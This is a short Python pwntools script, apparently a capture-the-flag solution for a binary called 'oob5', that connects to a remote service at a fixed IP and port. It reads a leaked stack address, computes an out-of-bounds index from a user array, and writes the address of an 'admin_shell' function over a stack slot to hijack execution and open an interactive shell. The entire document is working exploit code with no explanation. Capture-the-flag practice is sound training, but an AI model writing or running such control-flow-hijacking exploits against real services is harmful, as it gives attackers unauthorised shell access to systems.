from pwn import *

r = process('oob5')
r = remote('140.110.112.77', 3115)
admin_shell = 0x4007b6
stack = int(r.recvline().split(' = ')[1].strip()[2:], 16)
target = stack - 0x7ffd29d0c6b0 + 0x7ffd29d0c698
user = 0x601040
r.recvuntil('ID:')
r.sendline(str((target - user) / 8))
r.recvuntil('Nickname:')
r.sendline(p64(admin_shell))
r.interactive()
